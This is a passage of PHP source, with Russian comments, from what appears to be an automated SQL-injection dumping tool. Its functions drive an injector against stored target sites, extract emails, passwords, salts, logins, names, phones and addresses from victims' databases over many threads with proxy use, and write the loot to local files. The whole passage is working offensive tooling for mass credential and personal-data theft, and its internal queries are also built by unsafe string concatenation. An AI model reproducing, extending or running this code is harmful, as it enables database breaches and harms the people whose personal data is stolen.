			//sleep(1);
		}
		
		
		$this->Post->query("UPDATE  `multis_one` SET  `get` = 2 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
		fclose($fh);
		//fclose($fh2);
		return ;
	}

	function dumping_one_columns_limit($id=2,$potok = 1,$lastlimit = 0,$oneCount=0,$filename,$filename2){//слив 
		
		$this->d('!!!!!!!!!!!!!!!dumping_one_columns_limit!!!!!!!!!!!!!!!!!!');
		$hunta = 1;
		
		$mail2= $this->Post->query("SELECT * FROM  `fileds_one` WHERE `id` = ".$id." limit 1");
		
		
		
		
		
		
	//	$mail = $this->Filed->findbyid($id);

		
		$mail['Filed'] = $mail2[0]['fileds_one'];
		$filed_id = $mail['Filed']['id'];
		
		
		
		//$this->d($mail,'mail');
		
		
		//ставим количесво потоков
		
		$squle2 = $this->Post->query("SELECT * FROM  `posts_one` WHERE `url` = '".$mail['Filed']['site']."' or `gurl` = '".$mail['Filed']['site']."'  limit 0,1");
		//$this->d("SELECT * FROM  `posts_one` WHERE `url` = '".$mail['Filed']['site']."' or `gurl` = '".$mail['Filed']['site']."'  limit 0,1");

		$squle[0]['posts'] = $squle2[0]['posts_one'];
		
        
        
		
		if($squle[0]['posts']['id']=='')
		{
			$squle2 = $this->Post->query("SELECT * FROM  `posts` WHERE  `url` = '".$mail['Filed']['site']."' or `gurl` = '".$mail['Filed']['site']."'  limit 0,1");
			$this->d("SELECT * FROM  `posts` WHERE `id` = ".$mail['Filed']['post_id']." limit 0,1");

            $this->d('POST MAIN');
            
			$squle[0]['posts'] = $squle2[0]['posts'];
		
		}
        
		
		
		
		//если по какой то причине нету в POST_ONE то удаляем нах эту таблицу, качаться не будет, всё будет криво и плохо
		if(!isset($squle[0]['posts']['id']))
		{
			
			$data = $this->Post->query("UPDATE  `fileds_one` SET  `get` =  '3', multi = 0 WHERE  `id` =".$mail['Filed']['id']); 
			$this->d('vpizdu');
			
			
			if(!$this->Post->query("UPDATE  `multis_one` SET  `prich`='functiom limit netu v post_one'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id)){
					
					mysql_error();
				}
			
			return 'vpizdu';
			
		}
		
		$this->d($squle,'$squle POSTS');

		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			$this->d($set,'pass SET dump dumping_one_columns');
		}else
		{
			$set = false;
		}
		
		
		
		
		//инициируем первоначальные параметры
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();

		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['url'],$squle[0],$set);
		
		
		/////общие данные из выборки//////
		$bd = explode(':', $mail['Filed']['ipbase']);//все бд
		$count = $mail['Filed']['count'];
		
		$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
		
		$url = parse_url($squle[0]['posts']['url']);				
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone)-1];
        
        $filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/slivdump_one/".$url['host']."_".$bd[1]."_".$mail['Filed']['table']."_FON.txt";	
		//$filename2 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/slivdump_one/NOCHECK/".$url['host']."_".$bd[1]."_".$mail['Filed']['table']."._FONtxtNOCHECK";	
        
		//$filename = "./slivdump_one/".$url['host']."_FON_LINIT.txt";
		$fh = fopen($filename, "a+");
		//$fh2 = fopen($filename2, "a+");
		$pass = explode(':', $mail['Filed']['password']);
		$pass = $pass[1];
		$time = time();
		
		$fff = explode(',',$this->filed);
		
		///для хешей, дублей, и нулов//////
		$null = 0;
		$l=0;
		$tmp = array();
		$tmp3 = array();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->l5 = 0;
		$this->tmp5 = array();
		$this->emp_pass = 0;
		
	
		
		for ($i=$lastlimit;$i<ceil($lastlimit+$oneCount);$i++)
		{

			////определение зависания потока
			$this->workup();
			$new = time();
			$razn = $new-$time;

			if($razn>55)
			{
				$this->d($razn.'-razn dumping_one_limit > 55:');
				
				$this->Post->query("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
				
				if(!$this->Post->query("UPDATE  `multis_one` SET  `prich`='function limit razn > 55'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id)){
					
					mysql_error();
				}
				
				return 'vpizdu';
			}
			
			$time = time();

		if(!$this->Post->query("UPDATE  `multis_one` SET  `lastlimit` = $i,`date`= $time WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id)){
			
			mysql_error();
		}
		
			//$this->d("UPDATE  `multis_one` SET  `lastlimit` = $i,`date`= $time WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
			
			
			$mysql = $this->mysqlInj->mysqlGetValue($bd[1],$mail['Filed']['table'], $fff, $i,array(),'');
			//' WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').')'
			
		
        
//$this->d($mysql,'$mysql');       
 //exit;
			
			
            $out = array_keys($mysql); 
                
                
            
            
             if($mysql[$out[0]]!='' )   
            {
            
                
              
			
                if( $mysql[$out[0]] !='null')
                {
                        
                       // $this->d($mysql,'mysql 222-'.$i);
                            
                        $new = implode(',',$mysql);
                        
                       // $this->d($new,'$new');

                           // $this->d($mysql,'$$mysqls 111-'.$i);  
                            
                           
                                
                                    
                                    fwrite($fh, trim($new)."\n");
                                    
                                    echo $new.'||<br/>';
                                    
                                    //if($this->Post->query("INSERT INTO mails_dumping (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`) VALUES('{$mails[0]}','{$value}',now(),'{$domen}','none','{$bd[1]}','{$zone}')")){
                                        
                                            //echo $new.'||<br/>';
                                            //fwrite($fh, trim($new)."\n");
                                        
                                    //}else{
                                        //$this->d("INSERT INTO mails_dumping (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`) VALUES('{$mails[0]}','{$value}',now(),'{$domen}','none','{$bd[1]}','{$zone}')");
                                        
                                    //}
                            
                            
                                    
                                
                                    //echo $key.'<br>';
                                
                            
                }
                else
                {
                    $this->null++;
                    $this->d($this->null,'count NULL TRIM');
                    
                    
                    if($this->null == $this->null_count  and $this->up_one == false)
                    {
                        $this->d( 'Много пустных или null '.$this->null);
                        $this->logs('Mnogo null:'.$this->null.' '.$this->r,__FUNCTION__);
                        $this->Post->query("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
                        $this->Post->query("UPDATE  `multis_one` SET  `prich` = 'Mnogo null 100'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
                        
                       // $this->d("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
                        
                        //return 'vpizdu';
                    }
                    
                    
                }
                    

					$hunta = 0;
				
	
			}else
			{
				$hunta = $hunta+1;
				echo $hunta.'<br>';
			}

//exit;
			if($hunta==$this->hunta)
			{
				fclose($fh);
			
				$this->Post->query("UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
				
				$this->Post->query("UPDATE  `multis_one` SET  `prich`='function limit no data 200 raz'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
				
				$this->d('function limit no data 200 raz');
				
				return 'vpizdu';
			}		
		}
		
		
		$this->Post->query("UPDATE  `multis_one` SET  `get` = 2 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
		
		
		fclose($fh);
		//fclose($fh2);
		
		return true ;//	die();
	}
	
	function dumping_one_filed_name(){ //качаем все емайл имена через одиночный дампинг FILED -> FILED_ONE --MYSQL--
		
        
        $this->timeStart = $this->start('getmailfullMulti',3);
        
		 $ret =$this->Post->query("show columns FROM `fileds` where `Field` = 'name'");
		if($ret[0]['COLUMNS']['Field']=='name'){
			
		}else{
			$this->d('namefileds no, sozdaem fileds');
			$this->Post->query("ALTER TABLE fileds ADD name varchar(500) NOT NULL ");
		} 
        
        
        $ret =$this->Post->query("show columns FROM `fileds_one` where `Field` = 'name'");
		if($ret[0]['COLUMNS']['Field']=='name'){
			
		}else{
			$this->d('name fileds no, sozdaem fileds_one');
			$this->Post->query("ALTER TABLE fileds_one ADD name varchar(500) NOT NULL ");
		} 
        
        
        
        
         $ret =$this->Post->query("show columns FROM `fileds` where `Field` = 'adress'");
		if($ret[0]['COLUMNS']['Field']=='adress'){
			
		}else{
			$this->d('adress fileds no, sozdaem fileds');
			$this->Post->query("ALTER TABLE fileds ADD adress varchar(500) NOT NULL ");
		} 
        
        
        $ret =$this->Post->query("show columns FROM `fileds_one` where `Field` = 'adress'");
		if($ret[0]['COLUMNS']['Field']=='adress'){
			
		}else{
			$this->d('adress fileds no, sozdaem fileds_one');
			$this->Post->query("ALTER TABLE fileds_one ADD adress varchar(500) NOT NULL ");
		} 
        
        
		$ret =$this->Post->query("show columns FROM `fileds` where `Field` = 'login'");
		if($ret[0]['COLUMNS']['Field']=='login'){
			
		}else{
			$this->d('login fileds no, sozdaem fileds');
			$this->Post->query("ALTER TABLE fileds ADD login varchar(255) NOT NULL ");
		} 
        
        
        $ret =$this->Post->query("show columns FROM `fileds_one` where `Field` = 'login'");
		if($ret[0]['COLUMNS']['Field']=='login'){
			
		}else{
			$this->d('login fileds no, sozdaem fileds_one');
			$this->Post->query("ALTER TABLE fileds_one ADD login varchar(255) NOT NULL ");
		} 
		
		
        
        
        
		if($this->multidump_name_phone==false){
			
			return;
		}
        
         
         $sql = 'SELECT * FROM  `fileds` WHERE ';
         $sql2 = 'SELECT * FROM  `fileds` WHERE ';
         $sql3 = 'SELECT * FROM  `fileds` WHERE ';
         $sql4 = 'SELECT * FROM  `fileds` WHERE ';
         $sql5 = 'SELECT * FROM  `fileds` WHERE ';
         
          foreach($this->dump_pass_columns as $kk){
              
             if($kk !='salt'){
                 $sql2 .= "`$kk` !='' AND  `$kk` !=':' AND ";
             }
             
             if( $kk !='login'){
                 $sql3 .= "`$kk` !='' AND  `$kk` !=':' AND ";
             }
             
             if( $kk !='login' AND $kk !='salt'){
                 $sql4 .= "`$kk` !='' AND  `$kk` !=':' AND ";
             }
             
              
             $sql .= "`$kk` !='' AND  `$kk` !=':' AND ";
            
        }
        
        $sql .= " AND `dumping_one`=0 ";
        $sql .="  ORDER BY  `fileds`.`count` DESC limit 1";
        
        $sql2 .= " AND `dumping_one`=0 ";
        $sql2 .="  ORDER BY  `fileds`.`count` DESC limit 1";
        
        $sql3 .= " AND `dumping_one`=0 ";
        $sql3 .="  ORDER BY  `fileds`.`count` DESC limit 1";
        
        $sql4 .= " AND `dumping_one`=0 ";
        $sql4 .="  ORDER BY  `fileds`.`count` DESC limit 1";
        
        $sql5 .= " AND `dumping_one`=0 ";
        $sql5.="  ORDER BY  `fileds`.`count` DESC limit 1";
        
      
        
        
        $sql = str_replace('AND  AND','AND ',$sql);
        $sql2 = str_replace('AND  AND','AND ',$sql2);
        $sql3 = str_replace('AND  AND','AND ',$sql3);
        $sql4 = str_replace('AND  AND','AND ',$sql4);
        $sql5 = str_replace('AND  AND','AND ',$sql5);
        
        
        $this->d($sql,'$sql');
        $this->d($sql2,'$sql2');
        $this->d($sql3,'$sql3');
        $this->d($sql4,'$sql4');
        $this->d($sql5,'$sql5');
         

        // exit;
      
        if(count($this->dump_pass_columns)>1)
        {
            
             $data = $this->Post->query($sql);
            
            
            if(count($data)==0)
            {
                  $data = $this->Post->query($sql2);
                    
                   if(count($data)==0)
                    {
                          $data = $this->Post->query($sql3);
                          
                           if(count($data)==0)
                        {
                              $data = $this->Post->query($sql4);
                            
                            if(count($data)==0)
                            {
                                  $data = $this->Post->query($sql5);
                                
                            }    
                            
                        }    
                        
                    }          
                    
            }       
        }else
        {       
                        $data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password`!='' AND  `password` !=':' AND `salt` !='' AND `salt` !=':' AND `login` != ''  AND `login` !=':' AND `name` != ''  AND `name` !=':'  ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
                      
                      
                        if(count($data)==0)
                        {
                          $data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password` !='' AND  `password` !=':'  AND `login` != ''  AND `login` !=':' AND `name` != ''  AND `name` !=':'  ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
                         
                         
                            if(count($data)==0)
                            {
                             $data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password` !='' AND  `password `!=':' AND `login` !=''  AND `login` !=':' AND `solt` !=''  AND `solt` !=':'  ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
                            
                            
                            if(count($data)==0)
                            {
                                 $data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password` !='' AND  `password`!=':' AND `login` !=''  AND `login` !=':'   ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
                          
                          
                                if(count($data)==0)
                                {
                                 $data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password` !='' AND  `password` !=':' AND `name`!= ''  AND `name`!=':'   ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
                                    if(count($data)==0)
                                    {
                                        $data = $this->Post->query("SELECT * FROM  `fileds` WHERE `name` !='' AND  `name` !=':'  AND `phone` != ''  AND `phone` !=':' AND `adress` != ''  AND `adress` !=':'  ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
                                            
                                         if(count($data)==0)
                                        {
                                            $data = $this->Post->query("SELECT * FROM  `fileds` WHERE  AND `login` != ''  AND `login` !=':' AND `phone` != ''  AND `phone` !=':' AND `adress` != ''  AND `adress` !=':'  ORDER BY  `fileds`.`count` DESC limit 1"); //DESC

                                               if(count($data)==0)
                                                {
                                                    $data = $this->Post->query("SELECT * FROM  `fileds` WHERE  AND `login` != ''  AND `login` !=':' AND `adress` != ''  AND `adress` !=':'  ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
                                                    
                                                    if(count($data)==0)
                                                    {
                                                        $data = $this->Post->query("SELECT * FROM  `fileds` WHERE  AND `name` != ''  AND `name` !=':' AND `adress` != ''  AND `adress` !=':'  ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
                                                        
                                                        
                                                          if(count($data)==0)
                                                        {
                                                            $data = $this->Post->query("SELECT * FROM  `fileds` WHERE  AND `name` != ''  AND `name` !=':' AND `phone` != ''  AND `phone` !=':'  ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
                                                  
                                                        }  
                                              
                                                    }  
                                                    
                                          
                                                }      
                                                       

                                            
                                        }      
                                            
                                    }  
                            
                               
                                
                                
                            }
        
 
                        
                   }  
                        }
                        }
        }
		
			
     
      
		
		$names = $this->names;

		$phones = $this->phones;	
			
		$logins = 	$this->logins;
        
        $adress = $this->adress;
            
        $passwords = $this->passwords;    
        
        $salts = $this->salts;
        
            
        $this->d($data,' $data');
       // exit;
      
          // exit;  
       
       
        foreach($data as $val)
		{
			$this->d($val,$val);
			
			
			$post_id = $val['fileds']['post_id'];
			$ipbase = $val['fileds']['ipbase'];
			$ipbase2 = $ipbase;
			$table = $val['fileds']['table'];
			$label = $val['fileds']['label'];
			$url2 =  $val['fileds']['site'];
			$count = $val['fileds']['count'];
			$password =$val['fileds']['password'];
           // $pp = $val['fileds'][$ttt];
            
			$fff = $label.',';
			
			
            foreach($names as $name)
            {
                
                $name = trim($name);
                $name = strtolower($name);
				$nnn = str_replace(':','',$val['fileds']['name']); 
                $nnn = strtolower($nnn);
                
                
              
				
				if(preg_match("/$name/",$nnn))
				{
                    $this->d('совпадение !!!');
					$fff = str_replace(':','',$val['fileds']['name']).',';  
                
                }
                
            }
            
            
            foreach($passwords as $pass)
            {
                
                $pass = trim($pass);
                $pass = strtolower($pass);
				$nnn = str_replace(':','',$val['fileds']['password']); 
                $nnn = strtolower($nnn);
                //$this->d($pass,'nnn');
              
				
				if(preg_match("/$pass/",$nnn))
				{
                    $this->d('совпадение password !!!');
					$fff .= str_replace(':','',$val['fileds']['password']).',';  
                
                }
                
            }
            
            
            foreach($logins as $pass)
            {
                
                $pass = trim($pass);
                $pass = strtolower($pass);
				$nnn = str_replace(':','',$val['fileds']['login']); 
                 $nnn = strtolower($nnn);
                //$this->d($pass,'nnn');
              
				
                if($pass == $nnn or $pass.'s' ==$nnn)
                {
                    $this->d('совпадение login !!!');
					$fff .= str_replace(':','',$val['fileds']['login']).',';  
                }
                
                
            }
            
            
            
            foreach($salts as $pass)
            {
                
                $pass = trim($pass);
                $pass = strtolower($pass);
				$nnn = str_replace(':','',$val['fileds']['salt']); 
                 $nnn = strtolower($nnn);
                //$this->d($pass,'nnn');
              
				
               if(preg_match("/$pass/",$nnn))
				{
                    $this->d('совпадение salt !!!');
					$fff .= str_replace(':','',$val['fileds']['salt']).',';  
                }
                
                
            }
            
            
            foreach($adress as $pass)
            {
                
                $pass = trim($pass);
                $pass = strtolower($pass);
				$nnn = str_replace(':','',$val['fileds']['adress']); 
                 $nnn = strtolower($nnn);
                //$this->d($pass,'nnn');
              
				
                if(preg_match("/$pass/",$nnn))
				{
                    $this->d('совпадение salt !!!');
					$fff .= str_replace(':','',$val['fileds']['adress']).',';  
                }
                
                
            }
            
            
             foreach($phones as $pass)
            {
                
                $pass = trim($pass);
                $pass = strtolower($pass);
				$nnn = str_replace(':','',$val['fileds']['phone']); 
                 $nnn = strtolower($nnn);
                //$this->d($pass,'nnn');
              
				
                if(preg_match("/$pass/",$nnn))
				{
                    $this->d('совпадение phone !!!');
					$fff .= str_replace(':','',$val['fileds']['phone']).',';  
                }
                
                
            }
            
            if(strlen($fff)>5){
                
               $fff_new =  substr($fff, 0, -1);
                
            }
            
			$this->d($fff_new,'$fff$fff$fff$fff');
           // exit;
			
                
				
               
                    $squle2 = $this->Post->query("SELECT * FROM  `fileds_one` WHERE `post_id` =".$post_id." AND  `table`='".$table."' AND   `filed`='$fff_new' AND `count`=$count limit 0,1" );
                    
                    $this->d($squle2,'$squle2');
                   
                    if($squle2[0]['fileds_one']['id'] !='')
                    {

                        if($this->Post->query("UPDATE  `fileds_one` SET  `get` =  '1',`pri`=0,`multi` = 1,`potok`=0,`filed`='".$fff_new."' WHERE  `id` =".$squle2[0]['fileds_one']['id']))
                        {
                            
                          
                            
                            echo "АПДЕЙТ КОЛОНКИ ПОКА ЧТО НЕ РАЗРЕШАЕМ КАЧАТЬ !!!";
                        }
                        else
                        {
                            $this->d(mysql_error ());
                            
                        }
                        

                       
                    }else
                    {
                        if($this->Post->query("INSERT INTO `fileds_one` (`post_id`,`ipbase`,`ipbase2`,`table`,`label`,`site`,`count`,`filed`,`get`,`multi`,`password`) VALUES ($post_id,'$ipbase','$ipbase2','$table','$label','$url2',$count,'$fff_new','1',1,'$password')"))
                        {
							$this->d('good insert');
							
                        }else
                        {
                            $this->d(mysql_error ());
                            
                        }
                        
                    }
                    
                    
					
				}
                
               
                
                
                
				
            
            
           
              
			
			    
            
          if(!$this->Post->query("UPDATE  `fileds` SET  `dumping_one` =  1 WHERE  `fileds`.`id` =".$val['fileds']['id']))
         {
								
			//$this->d(mysql_error ());
		}    
            
		
		$this->d('stop');
		$this->stop();
	}
	
    function dumping_one_filed_name_insert($ttt,$names){   
        
       
			//exit;
    }		
			
        
    
	
	///////ДАМПИНГ МНОГОПОТОЧНЫЙ//////
	
	function getmailfullMulti(){ // слив всего и пассом и мыл
		
		
		
		$host = '92.63.105.55';//sexx
		if ($host != $_SERVER['HTTP_HOST'] && 'www.'.$host != $_SERVER['HTTP_HOST']){die();}
		
		mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/slivpass_save_solt", 0777);
		
		set_time_limit(0);
		$this->r = rand(1,100);
		
		
		$settings['potok_one']  = $this->potok_one;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass']= $this->pass;
		

		$this->timeStart = $this->start('getmailfullMulti',$settings['potok']);
		
		
		$this->logs("getmailfullMulti - START:{$this->r} ",__FUNCTION__);
		
		
		
		
		//Сначала с солью кто на докачку
		
		//if($this->pass_salt_check_only==true){
			
			$data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password`!='' AND  `password`!=':' AND `salt`!='' AND  `salt`!=':' AND `get` = '1' AND `multi`=1 ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
		//}
		
		
		
		if(count($data)==0)
		{
			$data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password`!='' AND  `password`!=':' AND `salt` !='' AND `salt`!=':' AND `get` = ''  ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
			
			
			
			if(count($data)==0)
			{
				
				if($this->pass_salt_check_only==true){
					$data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password`!='' AND  `password`!=':' AND `salt`!='' AND  `salt`!=':' AND `get` = '1' AND `multi`=1 ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
				
				}else{
					$data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password`!='' AND  `password`!=':' AND `get` = '1' AND `multi`=1 ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
				}
			
		
		
				if(count($data)==0)
				{
					
					if($this->pass_salt_check_only==true){
						$data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password`!='' AND  `password`!=':' AND `salt` !='' AND `salt`!=':' AND `get` = ''  ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
					
					}else{
						
							$data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password`!='' AND  `password`!=':' AND `get` = '' ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
					}
					
					
					if(count($data)==0)
					{	

						if($settings['dump_one'] == 1)
						{
							$data = $this->Post->query("SELECT * FROM  `fileds` WHERE (`password`='' or `password`=':') AND `get` = '1' AND `multi`=1 ORDER BY  `fileds`.`count` DESC limit 1");
							//$data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password`=':' AND `get` = '1' AND `multi`=1 ORDER BY  `fileds`.`count` DESC limit 1");
							
							if(count($data)==0)
							{	
								$data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password`=':' AND `get` = '' ORDER BY  `fileds`.`count` DESC limit 1");
								//$data = $this->Post->query("SELECT * FROM  `fileds` WHERE (`password`='' or `password`=':') AND `get` = '' ORDER BY  `fileds`.`count` DESC limit 1");
								
								if(count($data)==0)
								{
									$this->stop();
									die('stop NETU c ONE');
								}	
							}
						}else
						{
							$this->stop();
							die('stop ONE zapresheno, netu s passom');
						}				
					}	
				}
			}
		}
		
		
		//$data = $this->Post->query("SELECT * FROM  `fileds` WHERE `id`=119");
		//43
		
		$this->d($data,'nachalo getmailfullMulti');
		//exit;
		
		
		foreach($data as $val)
		{
			if($val['fileds']['up'] == 1)
			{
				$this->up = true;
			}
			
			
			if($val['fileds']['salt'] != '' AND $val['fileds']['salt'] != ':')
			{
				$this->salt = true;
			}else{
				
				$this->salt = false;
			}
			
			
			$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '1',`multi` = 1 WHERE  `fileds`.`id` =".$val['fileds']['id']);
			
			
			$this->Post->query("UPDATE  `starts` SET  `squle_id` = ".$val['fileds']['id']." WHERE  `time_start` =".$this->timeStart);
			
			
			if($val['fileds']['password']!=='' AND $val['fileds']['password']!==':' )
			{	
				
				if(trim($val['fileds']['typedb']) =='mssql')
				{	
					$sliv = $this->slivWithPassMssql($val['fileds']['id']);
				}else{
					$sliv = $this->slivWithPassConcastMulti($val['fileds']['id']);
				}
					
				
			}else
			{
				
				if(trim($val['fileds']['typedb']) =='mssql')
				{	
					$sliv = $this->slivWithPassMssql($val['fileds']['id']);
				}else{
					$sliv = $this->slivMulti($val['fileds']['id']);
				}
				
				
			}
			
			//exit;
			if($sliv!=='vpizdu')
			{		
				$multi = $this->Post->query("SELECT count(*) FROM  `multis` WHERE `filed_id` = ".$val['fileds']['id']." AND `get` =2");
				
				$this->d('////////////////////// NE V PIZDU OK VSE getmailfullMulti// ////////////////////////////////');
				if($multi[0][0]['count(*)'] == $settings['potok'])
				{
					//логирование
					$this->logs('YES multis zakonchilo, id '.$val['fileds']['id'],__FUNCTION__);
					$this->d('multis zakonchilo id '.$val['fileds']['id']);
					
					$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '2', `multi` = 2 WHERE  `fileds`.`id` = ".$val['fileds']['id']);

				}
				
			}else
			{
				
				$this->d('//////////////////////////////////////vpizdu getmailfullMulti////////////////////////////////////');
				
				//выбираем возможную инфу о потоках, если два уже с get 3 тогда и в общую таблицу пишет 3
				$multi =  $this->Post->query("SELECT count(*) FROM  `multis` WHERE `filed_id` = ".$val['fileds']['id']." AND `get` =2 AND `dok` = 1");
				$this->d($multi,'MULTI '."SELECT count(*) FROM  `multis` WHERE `filed_id` = ".$val['fileds']['id']." AND `get` =2 AND `dok` = 1");
				
				//всего сколько
				$multi2 = $this->Post->query("SELECT count(*) FROM  `multis` WHERE `filed_id` = ".$val['fileds']['id']." AND `get` !=0");
				$this->d($multi2,"MULTI2 SELECT count(*) FROM  `multis` WHERE `filed_id` = ".$val['fileds']['id']." AND `get` !=0");
				
				
				$multi3 = $this->Post->query("SELECT count(*) FROM  `multis` WHERE `filed_id` = ".$val['fileds']['id']." AND `get` =2 AND `potok`=6");
				$this->d($multi3," MULTI3 SELECT count(*) FROM  `multis` WHERE `filed_id` = ".$val['fileds']['id']." AND `get` =2 AND `potok`=6");
				
				$err = 2;
				
				
				
				if($multi[0][0]['count(*)'] >= $err){
					$this->d($val['fileds']['id'],'$multi[0][0][count(*)] >= $err');
					if($this->Post->query("UPDATE  `fileds` SET  `get` =  '3', `multi` = 0 WHERE  `fileds`.`id` =".$val['fileds']['id'])){
						$this->d("UPDATE  `fileds` SET  `get` =  '3', `multi` = 0 WHERE  `fileds`.`id` =".$val['fileds']['id'],'OK USPESHO');
						$this->logs("UPDATE  `fileds` SET  `get` =  '3', `multi` = 0 WHERE  `fileds`.`id` =".$val['fileds']['id'],'OK USPESHO');
					}else{
						$this->d("UPDATE  `fileds` SET  `get` =  '3', `multi` = 0 WHERE  `fileds`.`id` =".$val['fileds']['id'],'NO!!! NE USPESHO');
						$this->logs("UPDATE  `fileds` SET  `get` =  '3', `multi` = 0 WHERE  `fileds`.`id` =".$val['fileds']['id'],'NO!!! NE USPESHO');
					}
				}

				if($multi2[0][0]['count(*)'] >=6 AND $multi[0][0]['count(*)'] >= 1){
					
					$this->d('kol-vo potokov - '.$multi2[0][0]['count(*)'].' i odna oshibka to zakrivaem dumping');
					$this->logs('kol-vo potokov - '.$multi[0][0]['count(*)'].' i odna oshibka to zakrivaem dumping');
					$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '3', `multi` = 0 WHERE  `fileds`.`id` =".$val['fileds']['id']);
					
					$this->logs("getmailfullMulti - STOP:{$this->r} ",__FUNCTION__);
					$this->stop();
					die('okay');
				}
				
				if($multi2[0][0]['count(*)'] ==6 AND $multi3[0][0]['count(*)']==1){
					$this->d('$multi2[0][0][count(*)] ==6 AND $multi3[0][0][count(*)]==1');
					
					$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '2', `multi` = 2 WHERE  `fileds`.`id` =".$val['fileds']['id']);
					
					$this->logs("getmailfullMulti - STOP:{$this->r} ",__FUNCTION__);
					$this->stop();
					die('okay');
					
				}
				
				if($multi2[0][0]['count(*)'] ==6 AND $multi3[0][0]['count(*)']==1){
					$this->d('$multi2[0][0][count(*)] ==6 AND $multi3[0][0][count(*)]==1');
					
					$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '2', `multi` = 2 WHERE  `fileds`.`id` =".$val['fileds']['id']);
					
					$this->logs("getmailfullMulti - STOP:{$this->r} ",__FUNCTION__);
					$this->stop();
					die('okay');
					
				}
				
				if($multi2[0][0]['count(*)'] ==5 AND $multi[0][0]['count(*)']==1){
					$this->d('$multi2[0][0][count(*)] ==5 AND $multi[0][0][count(*)]==1');
					
					$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '2', `multi` = 2 WHERE  `fileds`.`id` =".$val['fileds']['id']);
					
					$this->logs("getmailfullMulti - STOP:{$this->r} ",__FUNCTION__);
					$this->stop();
					die('okay');
					
				}
				
			}
		}
		
		$this->logs("getmailfullMulti - STOP:{$this->r} ",__FUNCTION__);
		$this->stop();
		die('okay');
	}
	
	function slivWithPassConcastMulti($id=2){ //слив паролей через group concat многопоточный --MYSQL--
		
        
        if(!isset($this->raznica_dump) or $this->raznica_dump=='')$this->raznica_dump=60;
        
		$settings['potok_one']  = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass']= $this->pass;
		
		$mail = $this->Filed->findbyid($id);

		$filed_id = $mail['Filed']['id'];
		
		$this->logs($filed_id.'-$filed_id:'.$this->r,__FUNCTION__);
		
		$this->d(' nachalo slivWithPassConcastMulti');
		
		$squle = $this->Post->query("SELECT * FROM  `posts` WHERE `id` = ".$mail['Filed']['post_id']." limit 0,1");

		
		if(!isset($squle[0]['posts']['id'])){
			
			$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '3', multi = 0 WHERE  `fileds`.`id` =".$mail['Filed']['id']); 
			return 'vpizdu';
			
		}
		
		$this->d($squle,'$squle POSTS');

		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			$this->d($set,'pass SET dump slivWithPassConcastMulti');
		}else
		{
			$set = false;
		}
		
		///////общие данные из выборки/////////
		$bd = explode(':', $mail['Filed']['ipbase']);//все бд
		$count = $mail['Filed']['count'];
		$ff = intval($mail['Filed']['lastlimit']);//откуда начинать
		if($ff=='')$ff=0;
		
		
		
		//инициируем первоначальные параметры
